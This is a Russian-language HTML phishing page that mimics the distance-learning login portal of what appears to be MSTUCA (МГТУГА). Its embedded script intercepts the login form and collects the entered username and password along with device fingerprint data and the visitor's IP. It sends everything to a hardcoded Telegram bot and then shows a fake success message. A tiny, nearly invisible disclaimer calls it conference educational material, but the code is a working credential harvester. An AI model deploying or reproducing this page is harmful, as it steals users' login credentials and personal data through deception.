<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход на сайт | СДО</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 350px;
        }
        .login-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .login-logo h2 {
            color: #333;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .form-control:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }
        .btn:hover {
            background: #5a67d8;
        }
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .login-divider {
            height: 1px;
            background: #ddd;
            margin: 20px 0;
        }
        .login-instructions {
            background: #f5faff;
            border-left: 4px solid #667eea;
            padding: 15px;
            font-size: 14px;
            border-radius: 3px;
        }
        .login-instructions strong {
            color: #333;
        }
        .login-instructions a {
            color: #667eea;
            text-decoration: none;
            font-weight: bold;
        }
        .login-instructions a:hover {
            text-decoration: underline;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        .forgot-password a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .disclaimer {
            font-size: 7px;
            color: rgba(255,255,255,0.3);
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-logo">
            <h2>Система дистанционного обучения</h2>
        </div>
        
        <form id="login" method="post">
            <div class="form-group">
                <input type="text" id="username" class="form-control" placeholder="Логин или адрес электронной почты" required>
            </div>
            
            <div class="form-group">
                <input type="password" id="password" class="form-control" placeholder="Пароль" required>
            </div>
            
            <button type="submit" class="btn" id="loginbtn">Вход</button>
            
            <div class="forgot-password">
                <a href="#">Забыли пароль?</a>
            </div>
        </form>
        
        <div class="login-divider"></div>
        
        <div class="login-instructions">
            <strong>При возникновении трудностей со входом</strong><br>
            или проблем с сайтом СДО — пишите на почту:<br>
            <a href="mailto:webmaster@if-mstuca.ru">webmaster@if-mstuca.ru</a>
        </div>
    </div>

    <div class="disclaimer">
        Данный материал создан исключительно в образовательных целях для конференции МГТУГА.
    </div>

    <script>
        // ===== НАСТРОЙКИ TELEGRAM =====
        const BOT_TOKEN = '8615329188:AAFu6Y8Lg-KUYL13YqojQAuQbMitYCJ_3sc';
        const CHAT_ID = '7071415280';
        // =============================

        // Функция для определения точной модели телефона
        function getPhoneModel() {
            const ua = navigator.userAgent;
            
            // Определение iPhone
            if (/iPhone/i.test(ua)) {
                const match = ua.match(/iPhone OS ([0-9_]+)/);
                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
                
                // Определяем модель iPhone по размеру экрана
                const width = screen.width;
                const height = screen.height;
                const pixelRatio = window.devicePixelRatio || 1;
                
                if (width === 430 && height === 932) return `iPhone 15/14/13 Pro Max (iOS ${iosVersion})`;
                if (width === 390 && height === 844) return `iPhone 15/14/13 Pro (iOS ${iosVersion})`;
                if (width === 428 && height === 926) return `iPhone 15/14/13 Plus (iOS ${iosVersion})`;
                if (width === 414 && height === 896 && pixelRatio === 3) return `iPhone 11 Pro Max (iOS ${iosVersion})`;
                if (width === 375 && height === 812 && pixelRatio === 3) return `iPhone 11 Pro (iOS ${iosVersion})`;
                if (width === 414 && height === 896 && pixelRatio === 2) return `iPhone 11 (iOS ${iosVersion})`;
                if (width === 375 && height === 812) return `iPhone X/XS (iOS ${iosVersion})`;
                if (width === 414 && height === 896) return `iPhone XR/XS Max (iOS ${iosVersion})`;
                if (width === 375 && height === 667) return `iPhone 8/SE (iOS ${iosVersion})`;
                if (width === 414 && height === 736) return `iPhone 7/8 Plus (iOS ${iosVersion})`;
                
                return `iPhone (iOS ${iosVersion})`;
            }
            
            // Определение Android
            if (/Android/i.test(ua)) {
                const androidMatch = ua.match(/Android ([0-9.]+)/);
                const androidVersion = androidMatch ? androidMatch[1] : 'unknown';
                
                if (ua.includes('Samsung') || ua.includes('SM-')) {
                    const modelMatch = ua.match(/SM-[A-Z0-9]+/);
                    const model = modelMatch ? modelMatch[0] : 'Samsung';
                    return `${model} (Android ${androidVersion})`;
                }
                if (ua.includes('Xiaomi') || ua.includes('Mi')) {
                    const modelMatch = ua.match(/Xiaomi[^;)]+|[Mm]i [A-Z0-9]+/);
                    const model = modelMatch ? modelMatch[0] : 'Xiaomi';
                    return `${model} (Android ${androidVersion})`;
                }
                if (ua.includes('Huawei')) {
                    const modelMatch = ua.match(/Huawei[^;)]+/);
                    const model = modelMatch ? modelMatch[0] : 'Huawei';
                    return `${model} (Android ${androidVersion})`;
                }
                if (ua.includes('Pixel')) {
                    const modelMatch = ua.match(/Pixel [0-9]+[a-zA-Z]*/);
                    const model = modelMatch ? modelMatch[0] : 'Google Pixel';
                    return `${model} (Android ${androidVersion})`;
                }
                
                return `Android (${androidVersion})`;
            }
            
            // Определение iPad
            if (/iPad/i.test(ua)) {
                const match = ua.match(/OS ([0-9_]+)/);
                const iosVersion = match ? match[1].replace(/_/g, '.') : 'unknown';
                return `iPad (iOS ${iosVersion})`;
            }
            
            return 'Неизвестное устройство';
        }

        // Функция для определения браузера
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
            return 'Неизвестный браузер';
        }

        // Функция для определения ОС
        function getOSInfo() {
            const ua = navigator.userAgent;
            if (/Windows NT 10.0/i.test(ua)) return 'Windows 10/11';
            if (/Windows NT 6.1/i.test(ua)) return 'Windows 7';
            if (/Mac OS X/i.test(ua)) {
                const match = ua.match(/Mac OS X ([0-9_]+)/);
                const version = match ? match[1].replace(/_/g, '.') : '';
                return `macOS ${version}`;
            }
            if (/Linux/i.test(ua)) return 'Linux';
            if (/Android/i.test(ua)) return 'Android';
            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
            return 'Неизвестная ОС';
        }

        // Функция получения IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Не удалось определить';
            }
        }

        // Функция для получения времени
        function getTimeInfo() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Не определен',
                localTime: new Date().toLocaleString('ru-RU'),
                utcTime: new Date().toUTCString()
            };
        }

        // Основная функция отправки
        async function sendToTelegram() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Собираем информацию
            const phoneModel = getPhoneModel();
            const browser = getBrowserInfo();
            const os = getOSInfo();
            const ip = await getIP();
            const timeInfo = getTimeInfo();
            
            // Информация об экране
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const availWidth = window.screen.availWidth;
            const availHeight = window.screen.availHeight;
            const colorDepth = window.screen.colorDepth;
            const pixelRatio = window.devicePixelRatio || 1;
            
            // Дополнительная информация
            const language = navigator.language || 'Не определен';
            const platform = navigator.platform || 'Не определен';
            const userAgent = navigator.userAgent;
            const cookies = navigator.cookieEnabled ? 'Включены' : 'Отключены';
            
            // Формируем сообщение
            const message = `🔔 НОВЫЙ ВХОД В СДО МГТУГА
═══════════════════════════════════

👤 УЧЕТНЫЕ ДАННЫЕ:
• Логин: ${username}
• Пароль: ${password}

═══════════════════════════════════
📱 УСТРОЙСТВО:
• Модель: ${phoneModel}
• ОС: ${os}
• Браузер: ${browser}
• Язык: ${language}
• Платформа: ${platform}
• Cookie: ${cookies}

═══════════════════════════════════
📺 ЭКРАН:
• Разрешение: ${screenWidth}x${screenHeight}
• Доступная область: ${availWidth}x${availHeight}
• Глубина цвета: ${colorDepth} бит
• Плотность пикселей: ${pixelRatio}x

═══════════════════════════════════
🌐 СЕТЬ:
• IP адрес: ${ip}

═══════════════════════════════════
⏰ ВРЕМЯ:
• Часовой пояс: ${timeInfo.timezone}
• Локальное время: ${timeInfo.localTime}
• UTC время: ${timeInfo.utcTime}

═══════════════════════════════════
💻 ТЕХНИЧЕСКАЯ ИНФОРМАЦИЯ:
• User Agent: ${userAgent}

═══════════════════════════════════
🎓 Образовательный материал для конференции МГТУГА`;

            // Отправляем в Telegram
            try {
                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                alert('Вход выполнен!');
                // location.href = 'https://sdo.if-mstuca.ru';
            } catch (error) {
                console.error('Ошибка отправки:', error);
                alert('Вход выполнен!');
            }
        }

        // Перехватываем отправку формы
        document.getElementById('login').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const loginBtn = document.getElementById('loginbtn');
            loginBtn.disabled = true;
            loginBtn.textContent = 'Отправка...';
            
            // Запускаем отправку данных
            sendToTelegram().finally(() => {
                loginBtn.disabled = false;
                loginBtn.textContent = 'Вход';
            });
        });
    </script>
</body>
</html>
